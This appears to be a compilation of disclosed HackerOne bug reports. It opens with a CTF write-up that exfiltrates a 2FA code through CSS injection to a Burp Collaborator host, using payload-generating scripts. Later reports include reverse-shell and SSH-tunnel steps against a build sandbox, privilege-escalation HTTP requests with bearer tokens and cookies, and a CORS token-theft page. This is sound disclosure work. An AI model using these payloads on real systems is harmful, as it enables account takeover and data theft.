**#TryHarder**

`https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4` 

{F863539}

I only needed to intercept one report request, replace the url value with my enconding URL there, and send the request :) 

{F863547}

Note: `aHR0cHM6Ly9zdGFmZi5ib3VudHlwYXkuaDFjdGYuY29tLz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ=` is the base64 value of my payload. I encoded the injection because the endpoint works in this way.

{F863548}

Now I was so close to end the challenge, and I felt it. *brian.oliver* was the test account that I used in *https://app.bountypay.h1ctf.com/* so, those were the Marten Mickos credentials.

After logged into the Marten account with the same way as before, I started the payment process...

{F863549}

But wild 2Fa appeared :/

{F863550}

I tried to bypass in the same way but of course, it didn't work.
So, after a few minutes analizing the situation I discovered that the request send as a parameter a css resource:
```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
Upgrade-Insecure-Requests: 1

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

The first thing that I tried was change the `app_style` value with the url of my Burp Collaborator, and it worked! The collaborator recieved the request.
Now, I only needed to discover the way how to get the 2FA code with a CSS... 
I saw a few months ago something like ["Extract data via CSS Injection"](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d), so I try something simillar in this case, but for that, I needed to host a css file with an SSL conection.
After some search, I discovered that I could host my own page with `https://pages.github.com/`. Then, I created a repository and host my CSS file, ready for the injection.
First of all, I needed to know what kind of HTTP tags the page used:

```css
/**
Template for the UNI 2FA App
 */

@import url('https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/import.css');

body {
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/body");
}
input{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input");
}
div{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/div");
}
button{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/button");
}
```

With this CSS, I know if the CSS file was correctly imported (because I received the import request) and if almost one HTML element exists. 

In this case, my collaborator recieved 3 requests.
1. /import.css
2. /input
3. /div

I followed my instinct and continued with the input first, and if it didn't work I would continue with the div.
The second version was similar to the blog approach, but in my case, I needed first the name of the input
```css
/**
Template for the UNI 2FA App
 */

@import url('https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/import.css');

body {
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/body");
}
input{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input");
}
input[name^=a]{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputa");
}
input[name^=b]{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputb");
}
...
input[name^=8]{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input8");
}
input[name^=9]{
    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input9");
}
```

In this case, I recieved 3 requests:
1. /import.css
2. /input
3. /inputc

So, I felt good vibes...
And I was generating successively CSS files like an blind SQLi.
I created a little Python Script for generate the CSS file each time.
```python3
char_list = ['','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','\\.','\\-','_']
base = 'c'

for letter in char_list:
    print('input[name^={}{}]{{'.format(base, str(letter)))
    print('    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input{}{}");'.format(base, str(letter)))
    print('}')
```

Until... in one case I recieved 9 requests:
1. /import.css
2. /input
3. /inputcode_1
4. /inputcode_2
5. /inputcode_3
6. /inputcode_4
7. /inputcode_5
8. /inputcode_6
9. /inputcode_7

Ok... wait.
I remembered that the code that the page expects has 7 chars of length!
So I need to modify my css, and if my speculation would be correct, I only recieve one char for input.

```python3
import urllib.parse
lista = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','\\.','\\-','_','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','\\*','\\\\','\\|','\\/','\\+','\\=','\\@','\\?','\\(','\\)','\\[','\\]','\\?','\\@','\\¿','\\`','\\\'','\\´','\\"','\\{','\\}']

for code in range(7):
    code += 1
    for letter in lista:
        print('input[name=code_{}][value={}]{{'.format(str(code), str(letter)))
        encoded = urllib.parse.quote(str(letter))
        print('    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode{}_{}");'.format(str(code),encoded))
        print('}')
```

And that was :D 

{F863550}

I helped Mårten Mickos to approve May bug bounty payments!

{F863552}

## Impact

I helped Mårten Mickos to approve May bug bounty payments!

---

### [Bypass Email activation on http://axa.dxi.eu](https://hackerone.com/reports/418267)

- **Report ID:** `418267`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** 8x8
- **Reporter:** @madrobot
- **Bounty:** - usd
- **Disclosed:** 2020-06-09T20:12:16.221Z
- **CVE(s):** -

**Summary (team):**

The account activation link utilized by the ContactNow application utilized a token in the existing session for validation. Knowing this token it was possible to bypass the activation step.

---

### [Docker Registry HTTP API v2 exposed in HTTP without authentication leads to docker images dumping and poisoning](https://hackerone.com/reports/347296)

- **Report ID:** `347296`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Semmle
- **Reporter:** @thehackerish
- **Bounty:** - usd
- **Disclosed:** 2020-06-06T08:35:04.183Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Docker Registry HTTP API v2 is exposed in HTTP without authentication. An attacker can use it to dump your docker images and poison them.

**Description:**
While digging into the environment that hosts the sandboxed build container, I came across the port 5000 open on another machine (probably the host), which is used for Docker Registry (https://docs.docker.com/registry/). I was able to reach the service and dump the `lgtm/top` repository. I didn't try to upload anything because I didn't want to alter your docker images.

## Steps To Reproduce:

  1. Create a GitHub repository that has the attached file, name it .lgtm.yml and modify `ATTACKER_HOST` and `ATTACKER_PORT` to yours.
  2. set up a netcat listener: `nc -vlp ATTACKER_PORT`
  3. Add the project to lgtm, it should start building it. After some time, you should get a reverse shell.
  4. Make a remote SSH tunnel from the build container `ssh -R 5555:172.17.0.1:5000 attacker@ATTACKER_HOST -p SSH_PORT -f -N`
  5. Enter your attacker password and a SSH tunnel should be up.
  6. Using the docker_fetch tool (https://github.com/NotSoSecure/docker_fetch/), use the url http://127.0.0.1:5555 and dump the repository that you want.
  7. Additionally, you can follow this reference if you would like to test for blob uploads (https://docs.docker.com/registry/spec/api/#initiate-blob-upload) and look for this string `/v2/<name>/blobs/uploads/`. I tried to initiate an upload and it gave me the uuid of the upload, which means no restriction is made for uploads.

**NOTE**: Even if the shell is lost from the sandbox, the SSH Tunnel still works. This might mean a **sandbox escape**

## Supporting Material/References:

  *A writeup about the vulnerability in a pentest:  https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/
  *The Docker Registry Doc: https://docs.docker.com/registry/spec/api/#initiate-blob-upload

## Remediation:
1. Implement authentication to the service.
2. Use HTTPS
3. Limit the possibility of reverse shells by whitelisting only useful ports ( It might be challenging because of the purpose of the build sandbox)

## Impact

An attacker can use it to dump your docker images and poison them.

---

### [Organization Takeover](https://hackerone.com/reports/809816)

- **Report ID:** `809816`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Helium
- **Reporter:** @azraelsec
- **Bounty:** 500 usd
- **Disclosed:** 2020-05-27T20:51:57.485Z
- **CVE(s):** -

**Vulnerability Information:**

Hello @helium,
The **console.helium.com** application doesn't correctly manage the `/membership/` resources and allows a user to privilege escalate an organization of which he's part of just modifying it's role.

# Steps to reproduce the bug

1) Let's make two user accounts:
- `azraelsec@wearehackerone.com` **[A]**
- `███` **[B]** (*this is actually my personal account and can be deleted*)

**Initial Context**: azraelsec is Administrator of the `hackerone` organization while federicogerardi94 is Administrator of the **testhackerone** organization.
*Goal*: azraelsec becomes Administrator of **testhackerone**.

2) [B] invites [A] to take part in his **testhackerone** organization with the role of **Manager**

3) [A] switches to **testhackerone** organization and makes a graphql query to leak his **Manager** membership's id (using graphql it's only possible to see the memberships of the current organization):
```
POST /graphql HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 488
accept: */*
Sec-Fetch-Dest: empty
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxMTQ0LCJpYXQiOjE1ODMyNTQ3NDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIzNzQ4ZmJkYS1iMjhiLTRlOWYtOThiMy00ZTUzMGRlYWEwNmMiLCJuYmYiOjE1ODMyNTQ3NDMsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.-1VwG72225yPkZ0BimNSw_DFURRlT8Wh-AcAuDXgJFEEfiPduEdWcwwxY6-oQEHx8ILFUlxQYdbduYiTA-D79Q
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
content-type: application/json
Origin: https://console.helium.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://console.helium.com/users
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTQ3NDg0OTgsImV2ZW50SWQiOjE5MywiaWRlbnRpZnlJZCI6NDEsInNlcXVlbmNlTnVtYmVyIjoyMzR9

{"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
```
```
HTTP/1.1 200 OK
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Content-Length: 514
Content-Type: application/json; charset=utf-8
Date: Tue, 03 Mar 2020 16:59:27 GMT
Server: Cowboy
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur

{"data":{"memberships":{"__typename":"PaginatedMemberships","entries":[{"__typename":"Membership","email":"████████","id":"512c8188-7008-49ce-a140-3538696e8c2c","inserted_at":"2020-03-03T16:09:37","role":"admin","two_factor_enabled":false},{"__typename":"Membership","email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","inserted_at":"2020-03-03T16:42:49","role":"manager","two_factor_enabled":false}],"pageNumber":1,"pageSize":10,"totalEntries":2,"totalPages":1}}}
```
**NOTE**: [A] is a member of **testhackerone** with the role of **Manager** using the membership id `bc96332e-c6b4-4728-b35e-8145eea0996a`

3) [A] switches back to his **hackerone** organization (this will provide him a new full-privileged token) and sends a PUT request on the /membership/ resource pointing out the membership's id leaked before, changing his role to `admin`:
```
PUT /api/memberships/bc96332e-c6b4-4728-b35e-8145eea0996a HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 31
accept: */*
Sec-Fetch-Dest: empty
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxNTA0LCJpYXQiOjE1ODMyNTUxMDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiJkODIxNzAwYS0xMGE5LTQwOGItYjc3ZC01OGY5ODY2ZWFkZmUiLCJuYmYiOjE1ODMyNTUxMDMsIm9yZ2FuaXphdGlvbiI6IjZjNmM4YzhhLTQ5ZmUtNGJlZi1hMDBjLWZkOTliZWUzOWIwZCIsIm9yZ2FuaXphdGlvbl9uYW1lIjoiaGFja2Vyb25lIiwic3ViIjoiNTU5NDZkMGUtMGE5MC00ZDRkLTlkYjgtMTIyMzYyZjU3NzU2IiwidHlwIjoiYWNjZXNzIn0.r13Aj4TXYzLYJ7clq9gl_SbpdSnVZpUsj0rFtgIMMeUXAE-44iiReL8bffEy4414L6Ess-dOH5L7MFiT55GAqw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
content-type: application/json
Origin: https://console.helium.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://console.helium.com/users
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTEwNzEwNDEsImV2ZW50SWQiOjEzOSwiaWRlbnRpZnlJZCI6MjksInNlcXVlbmNlTnVtYmVyIjoxNjh9

{"membership":{"role":"admin"}}
```

Since the back-end only checks if the requesting account has is an admin in its actual organization' scope but not if the membership that he's modifying is related to this, the request works, allowing [A] to becoming **Administrator** of **hackeronetest** organization:
```
HTTP/1.1 200 OK
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Content-Length: 154
Content-Type: application/json; charset=utf-8
Date: Tue, 03 Mar 2020 17:10:01 GMT
Message: User role updated successfully
Server: Cowboy
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur

{"email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","joined_at":"2020-03-03T16:42:49","role":"admin","type":"memberships"}
```

**NOTE**: [A] has to be sure not to switch to **testhackerone**!! To exploit the vulnerability [A] needs to remain inside the organization of which he is Administrator (a POST call to `/api/organizations/6c6c8c8a-49fe-4bef-a00c-fd99bee39b0d/switch` will invalidate the Bearer token and provide a new one that has the correct privileges).

4) Now [A] can switch again organization to **hackeronetest** and administrate it as Administrator:
```
POST /graphql HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 488
accept: */*
Sec-Fetch-Dest: empty
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQyMDk5LCJpYXQiOjE1ODMyNTU2OTksImlzcyI6ImNvbnNvbGUiLCJqdGkiOiI0YWM5ZDk2OC1hMGYwLTQ5MDgtODZmMi0wNTE3ZjE3OTE0NjMiLCJuYmYiOjE1ODMyNTU2OTgsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.rShCG6pW0Pjkd_dd8KTslyKPU38jrzhMrn39dkxdIqhePsCFx4FsEmNSKXTNm2zD02dPZNkp_N_FGtcen8kaeQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
content-type: application/json
Origin: https://console.helium.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://console.helium.com/users
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTU3MDI0MTAsImV2ZW50SWQiOjIwMywiaWRlbnRpZnlJZCI6NDMsInNlcXVlbmNlTnVtYmVyIjoyNDZ9

{"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
```
```
HTTP/1.1 200 OK
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Content-Length: 512
Content-Type: application/json; charset=utf-8
Date: Tue, 03 Mar 2020 17:17:12 GMT
Server: Cowboy
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur

{"data":{"memberships":{"__typename":"PaginatedMemberships","entries":[{"__typename":"Membership","email":"█████████","id":"512c8188-7008-49ce-a140-3538696e8c2c","inserted_at":"2020-03-03T16:09:37","role":"admin","two_factor_enabled":false},{"__typename":"Membership","email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","inserted_at":"2020-03-03T16:42:49","role":"admin","two_factor_enabled":false}],"pageNumber":1,"pageSize":10,"totalEntries":2,"totalPages":1}}}
```

## Impact

This vulnerability lets a user with low privileges to escalate and to **become Administrator of an Organization** of which was a simple Manager, deleting the original Administrator and to full control it

---

### [[Critical] Insufficient Access Control On Registration Page of Webapps Website Allows Privilege Escalation to Administrator ](https://hackerone.com/reports/796379)

- **Report ID:** `796379`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hunt4p1zza
- **Bounty:** - usd
- **Disclosed:** 2020-05-27T14:20:32.011Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Hello.

Due to insufficient access controls and poor implementation of the registration at https://████████/████/login.cfm it was possible to register while privilege escalating to an administrator.

**Description:**
It was possible to tamper with the registration request at https://█████████/██████/screen_questions.cfm which is aimed to ███████ applications for education in order to sign-up with administrator privileges. As a result, it was possible to gain access to personally identifiable information (PII) of all the applicants in the system, including SSNs, names, phones and emails.

At this point I stopped digging further and I started writing this report.

**Note:** Please can you liaise with the system's administrator and kindly ask them to remove the below accounts from the system after this has been triaged and resolved:

```
██████
█████████
███
█████████
██████
███
█████████
█████████
```

Apologies for creating all these accounts, most of them are just low privileged applicants, but I was confused as to why this attack worked and it took few attempts to figure it out.

Please let me know when this is resolved and I will remove any evidence that include PII data from my local system which are only kept locally.

## Impact
An attacker can gain administrative access in the system allowing them to expose sensitive PII information, such as including SSNs, names, phones and emails. Having this access, an attacker could completely take over the website and perform further attacks against it from this authenticated viewpoint - however I did not perform this. Attackers may sell this PII information on black-markets for profit.

If this was exploited and published there would be severe reputational and legal ramifications for DoD.

## Step-by-step Reproduction Instructions

1. Initially, enable your web intercepting proxy such as Burp Suite
2. Next, browse to the initial registration page at: https://████/████████/screen_questions.cfm and choose options in the dropdown lists: █████████
3. Next, you will be taken at the actual registration page at https://████/████████/newuser.cfm?loc_class=L (you can probably skip step 2 and come right here)
4. Fill in this form with some information and a legitimate looking SSN number. Keep in mind that if the SSN is registered in the system, the website will error, so you will have to try another one.
5. Intercept the request and modify it so that the `user_type` parameter has value 4, and the `fname` and `lname` parameters have values `Hackerone<%` and `test<%xss`. I believe it is `<%` that is causing this privilege escalate issue, but as I am not 100% positive I am giving you the full values. The request should look like mine: █████
6. If all went well, you should be logged in and prompted with a Privacy page which you need to accept.
7. Notice how this account has administrator access, an example is shown below: █████████

Finally, I created 2 short PoC videos showing how I was able to register as admin and how I was able to access PII data:

Create admin account video: ██████

Access PII data video: {F716040}

## Product, Version, and Configuration (If applicable)
The https://█████████ website is under █████████ which is part of DoD, as shown: █████████

## Suggested Mitigation/Remediation Actions
Unfortunately, I am not 100% positive on what exactly is causing this flaw, but injection of `<%` is required. This could be mitigated by applying strict user input validation in the `fname` and `lname` fields. Please see the link below for more information:

https://owasp.org/www-project-cheat-sheets/cheatsheets/Input_Validation_Cheat_Sheet

I would also recommend that you review the current user access types and levels in accordance with the findings above to ensure that setting the `user_type` to other numbers than the default one when registering (5) does not allow users to gain more privileges than they are authorized to. 

Additionally, review the whole codebase for broken access control, the following cheatsheet from OWASP provides more information:

https://owasp.org/www-project-cheat-sheets/cheatsheets/Access_Control_Cheat_Sheet

Finally, the web application appears to be very susceptible to common web application attacks and I would recommend that this undertakes a full thorough security test if possible or a code review, if of course it is required and cannot be decommissioned. 

PS: I will do my best to submit reports in terms of the rest of flaws I was able to spot while looking at it.

## Impact

An attacker can gain administrative access in the system allowing them to expose sensitive PII information, such as including SSNs, names, phones and emails. Having this access, an attacker could completely take over the website and perform further attacks against it from this authenticated viewpoint - however I did not perform this. Attackers may sell this PII information on black-markets for profit.

If this was exploited and published there would be severe reputational and legal ramifications for DoD.

---

### [CORS Misconfiguration Leads to Exposing User Data](https://hackerone.com/reports/733017)

- **Report ID:** `733017`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @roethke
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T17:15:14.213Z
- **CVE(s):** -

**Vulnerability Information:**

**Vulnerable Asset:** https://██████/█████████/

**Discovery:**
- Upon accessing the site we discover two specific response headers which indicates that a cross-domain request for sensitive information might be possible
 1. Access-Control-Allow-Origin: *injectable*
 2. Access-Control-Allow-Credentials: true
- We craft a POC below and exploit the misconfigurations present by exposing the users API key, email, first name, last name, etc.

███

**POC:**
* This is hosted on http://█████████

```html
<html>
<script>
  var xhttp = new XMLHttpRequest();
  <!-- the below endpoint lists API tokens previously generated by the user -->
  xhttp.open("GET", "https://█████/████/api/token/list", true);
  xhttp.withCredentials = true;
  xhttp.send(null);
</script>
</html>
```

**Demo:**

███████

**Remediations:**
- Do not allow the Access-Control-Allow-Origin to be arbitrarily set by the user; the domain should be whitelisted that is allowed access to CORS, or the wildcard operator `*` should be used instead, which will disallow the Allow-Credentials header

## Impact

This attack works similarly to a CSRF attack in that an attacker would need to have a victim visit the attacker's website in order to trigger the exploit. If the victim is logged in, then the result is full access to API keys which serve in lieu of username/password as shown in the demo. The attacker then can perform any action within the user's account that the API allows.

---

### [[██████████] Unauthorized access to admin panel](https://hackerone.com/reports/648222)

- **Report ID:** `648222`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jarvis0x1
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T16:52:06.670Z
- **CVE(s):** -

**Vulnerability Information:**

In previous reports, I described vulnerabilities in a panel to which I had access. 

 #512269
 #512693
 #512695

I could log in to this site and then perform some attacks, such as SQL injection\XSS or other bugs. But before the above vulnerabilities were considered by you, the possibility to bypass authorization on the site was disabled. And after that, the vulnerabilities could not be reproduced and I was forced to close my reports.

Recently, I began to explore this site again. And I found that the developers have poorly implemented the restriction of authorization on the site. 

I can still get the contents of an authorized site. How? When I visit some pages of the site, I get a redirect to the authorization form. But in addition to the redirect, the response body also contains HTML code of auth site.

Look this pages:
> https://███████/mission.php
> https://██████████/personnel.php
> https://███████/index.php

### Steps to reproduce
1) Turn on Live Interception in burp (Proxy-Intercept)
2) Intercept request. Press right mouse button-> Do intercept -> Response this request
█████████
3) Delete this redirection
████

Here I can see a lot of private information

> https://█████████/personnel.php

█████

> https://███/index.php

███████

## Impact

Incorrect access restriction to the authorized interface of the site leads to information leakage.

---

### [Unrestricted File Upload](https://hackerone.com/reports/683024)

- **Report ID:** `683024`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @javilarx8
- **Bounty:** - usd
- **Disclosed:** 2020-05-11T16:40:09.327Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The endpoint at https://███████/ui/core/index.html required authentication, but navigating to https://█████/ui/core/index.html?mode=public#expl-tabl./SHARED/rpchllmd/CSAT allow for read/write access.

**Description:**
The endpoint at https://████/ui/core/index.html?mode=public#expl-tabl./SHARED/rpchllmd/CSAT allowed for read as well as write access. It was possible to create directories and upload images as well as .exe files such as putty.exe. 

## Impact
An attacker can attempt to use the site to host malware, or perform social engineering attacks since the domain URL will be a .mil address.

## Step-by-step Reproduction Instructions

1. Navigate to:
https://████/ui/core/index.html?mode=public#expl-tabl./SHARED/rpchllmd/CSAT
2. Create sub-directory 
3. Upload test files
4. Files are then uploaded and hosted on a .mil website without authenticating to the application.

## Product, Version, and Configuration (If applicable)
FileCloud software
https://www.getfilecloud.com/
## Suggested Mitigation/Remediation Actions
Enforce authentication on endpoints of the application, restrict file uploads to only necessary business requirements. If possible restrict uploads to .jpg .pfd .docx. Don't allowed upload of executable files

## Impact

An attacker can attempt to use the site to host malware, or perform social engineering attacks since the domain URL will be a .mil address.

---

### [IDOR in the https://market.semrush.com/](https://hackerone.com/reports/837400)

- **Report ID:** `837400`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Semrush
- **Reporter:** @albatraoz
- **Bounty:** - usd
- **Disclosed:** 2020-04-30T16:37:31.926Z
- **CVE(s):** -

**Summary (team):**

Insecure direct object references in marketplace due to a length restrictions in chosen hashing function.

---

### ["Secure View" aka "Hide Download" can be bypassed easily](https://hackerone.com/reports/788257)

- **Report ID:** `788257`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Nextcloud
- **Reporter:** @at5djl3pwjmunyutnoatp
- **Bounty:** - usd
- **Disclosed:** 2020-04-10T09:12:36.773Z
- **CVE(s):** CVE-2020-8139

**Vulnerability Information:**

The mid-2019 announced feature "Secure view" (https://nextcloud.com/blog/secure-view-prevent-your-shared-files-from-getting-downloaded/) allows for hiding the Download button on public shares.
Even though the announcement admits that there are always workarounds out there to get hands on the file anyway, the workaround for this one is way too simple: Just add **/download** to the URL (like you used to for every public share) and your browser starts downloading unhesitently.

